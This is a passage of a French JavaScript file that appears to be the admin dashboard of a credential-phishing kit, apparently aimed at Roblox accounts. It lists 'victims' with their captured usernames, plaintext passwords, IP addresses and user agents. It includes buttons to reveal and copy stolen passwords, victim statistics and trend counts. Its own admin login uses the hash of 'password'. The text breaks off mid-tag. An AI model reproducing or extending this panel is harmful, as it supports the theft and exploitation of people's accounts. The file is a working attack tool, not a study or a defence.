// Configuration sécurisée
const ADMIN_CONFIG = {
    passwordHash: 'f06fe546025978a464814de8707eed32829a145e9967f3feaa57e0b5b8e0b8b6', // "password" en SHA256
    maxAttempts: 3,
    lockoutTime: 300000, // 5 minutes
    sessionDuration: 1800000 // 30 minutes
};

// State management
let currentUser = null;
let loginAttempts = 0;
let lockoutTimer = null;
let victims = [];
let currentPage = 1;
const itemsPerPage = 10;

// Initialisation
document.addEventListener('DOMContentLoaded', () => {
    createAdminParticles();
    checkExistingSession();
    loadVictims();
    updateStats();
    
    // Auto refresh toutes les 30 secondes
    setInterval(() => {
        if (currentUser) {
            loadVictims();
            updateStats();
        }
    }, 30000);
});

// Particules d'ambiance admin
function createAdminParticles() {
    const container = document.getElementById('admin-particles');
    for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'admin-particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 5 + 's';
        p.style.animationDuration = (Math.random() * 10 + 10) + 's';
        container.appendChild(p);
    }
}

// Hash SHA256
async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Login avec animation de sécurité
async function adminLogin() {
    const username = document.getElementById('admin-user').value;
    const password = document.getElementById('admin-pass').value;
    const errorDiv = document.getElementById('login-error');
    
    if (loginAttempts >= ADMIN_CONFIG.maxAttempts) {
        showError('Trop de tentatives. Compte verrouillé 5 minutes.');
        return;
    }
    
    // Animation de vérification
    const check1 = document.getElementById('check-1');
    const check2 = document.getElementById('check-2');
    
    check1.classList.add('checking');
    await sleep(800);
    check1.classList.remove('checking');
    check1.classList.add('checked');
    
    check2.classList.add('checking');
    await sleep(800);
    check2.classList.remove('checking');
    check2.classList.add('checked');
    
    const hashedInput = await sha256(password);
    
    if (hashedInput === ADMIN_CONFIG.passwordHash && username === 'admin') {
        // Success
        currentUser = {
            username: username,
            loginTime: Date.now(),
            ip: generateRandomIP()
        };
        
        saveSession();
        showDashboard();
        addLog(`Connexion réussie: ${username} depuis IP ${currentUser.ip}`);
    } else {
        loginAttempts++;
        const remaining = ADMIN_CONFIG.maxAttempts - loginAttempts;
        showError(`Identifiants invalides. ${remaining} tentatives restantes.`);
        
        if (loginAttempts >= ADMIN_CONFIG.maxAttempts) {
            lockout();
        }
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function showError(msg) {
    const errorDiv = document.getElementById('login-error');
    errorDiv.textContent = msg;
    errorDiv.style.display = 'block';
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 3000);
}

function lockout() {
    const btn = document.querySelector('.admin-login-btn');
    btn.disabled = true;
    setTimeout(() => {
        btn.disabled = false;
        loginAttempts = 0;
    }, ADMIN_CONFIG.lockoutTime);
}

function saveSession() {
    const session = {
        user: currentUser,
        expires: Date.now() + ADMIN_CONFIG.sessionDuration
    };
    localStorage.setItem('admin_session', JSON.stringify(session));
}

function checkExistingSession() {
    const session = JSON.parse(localStorage.getItem('admin_session') || 'null');
    if (session && session.expires > Date.now()) {
        currentUser = session.user;
        showDashboard();
    }
}

function showDashboard() {
    document.getElementById('admin-login').style.display = 'none';
    document.getElementById('admin-dashboard').style.display = 'flex';
    document.getElementById('admin-ip').textContent = currentUser.ip;
    startSessionTimer();
    initChart();
}

function startSessionTimer() {
    const updateTimer = () => {
        const remaining = Math.floor((currentUser.loginTime + ADMIN_CONFIG.sessionDuration - Date.now()) / 1000);
        if (remaining <= 0) {
            adminLogout();
            return;
        }
        const mins = Math.floor(remaining / 60);
        const secs = remaining % 60;
        document.getElementById('session-time').textContent = 
            `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };
    setInterval(updateTimer, 1000);
    updateTimer();
}

function adminLogout() {
    localStorage.removeItem('admin_session');
    currentUser = null;
    location.reload();
}

// Gestion des victimes
function loadVictims() {
    // Charger depuis le localStorage (simulation)
    victims = JSON.parse(localStorage.getItem('captured_data') || '[]');
    victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    renderVictims();
    updateStats();
}

function renderVictims() {
    const tbody = document.getElementById('victims-tbody');
    const recentList = document.getElementById('recent-victims-list');
    
    // Table pagination
    const start = (currentPage - 1) * itemsPerPage;
    const paginated = victims.slice(start, start + itemsPerPage);
    
    tbody.innerHTML = paginated.map((v, i) => `
        <tr class="victim-row" onclick="showVictimDetail(${start + i})">
            <td><input type="checkbox" class="victim-check"></td>
            <td><img src="${v.avatar || 'https://via.placeholder.com/40'}" class="victim-avatar-small"></td>
            <td><strong>${escapeHtml(v.username)}</strong></td>
            <td><code class="password-mask" onclick="togglePassword(this, '${escapeHtml(v.password)}')">••••••••</code></td>
            <td><span class="ip-badge">${v.ip || 'N/A'}</span></td>
            <td>${formatDate(v.timestamp)}</td>
            <td class="user-agent-cell" title="${escapeHtml(v.userAgent || '')}">${truncate(v.userAgent, 30)}</td>
            <td>
                <button class="btn btn-sm btn-info" onclick="event.stopPropagation(); copyData('${escapeHtml(v.username)}', '${escapeHtml(v.password)}')">
                    <i class="fas fa-copy"></i>
                </button>
                <button class="btn btn-sm btn-danger" onclick="event.stopPropagation(); deleteVictim(${start + i})">
                    <i class="fas fa-trash"></i>
                </button>
            </td>
        </tr>
    `).join('');
    
    // Recent list (sidebar)
    recentList.innerHTML = victims.slice(0, 5).map(v => `
        <div class="recent-victim-item">
            <img src="${v.avatar || 'https://via.placeholder.com/32'}" class="rv-avatar">
            <div class="rv-info">
                <div class="rv-name">${escapeHtml(v.username)}</div>
                <div class="rv-time">${timeAgo(v.timestamp)}</div>
            </div>
            <div class="rv-amount">${v.amount || 'N/A'} R$</div>
        </div>
    `).join('');
    
    document.getElementById('page-info').textContent = 
        `Page ${currentPage} sur ${Math.ceil(victims.length / itemsPerPage) || 1}`;
    document.getElementById('victim-count').textContent = victims.length;
}

function updateStats() {
    document.getElementById('total-victims').textContent = victims.length;
    document.getElementById('passwords-count').textContent = victims.length;
    
    const today = new Date().toDateString();
    const todayCount = victims.filter(v => new Date(v.timestamp).toDateString() === today).length;
    document.getElementById('today-victims').textContent = todayCount;
    
    if (victims.length > 0) {
        const last = new Date(victims[0].timestamp);
        document.getElementById('last-activity').textContent = 
            last.toLocaleTimeString('fr-FR', {hour: '2-digit', minute: '2-digit'});
    }
    
    // Trend calculation
    const yesterday = new Date();
    yesterday.setDate(yesterday.getDate() - 1);
    const yestCount = victims.filter(v => new Date(v.timestamp).toDateString() === yesterday.toDateString()).length;
    const trend = yestCount > 0 ? Math.round(((todayCount - yestCount) / yestCount) * 100) : 100;
    document.getElementById('trend-percent').textContent = trend;
}

function togglePassword(el, realPass) {
    if (el.textContent === '••••••••') {
        el.textContent = realPass;
        el.classList.add('revealed');
    } else {
        el.textContent = '••••••••';
        el.classList.remove('revealed');
    }
}

function showVictimDetail(index) {
    const v = victims[index];
    const modal = document.getElementById('victim-modal');
    const content = document.getElementById('modal-content');
    
    content.innerHTML = `
        <div class="victim-detail">
            <div class="vd-header">
                <img src="${v.avatar || 'https://via.placeholder.com/80'}" class="vd-avatar">
                <div class="vd-title">
                    <h3>${escapeHtml(v.username)}</h3>
                    <span class="vd-badge">Capturé</span>
                </div>
            </div>
            <div class="vd-grid">
                <div class="vd-item">
                    <label>Mot de passe</label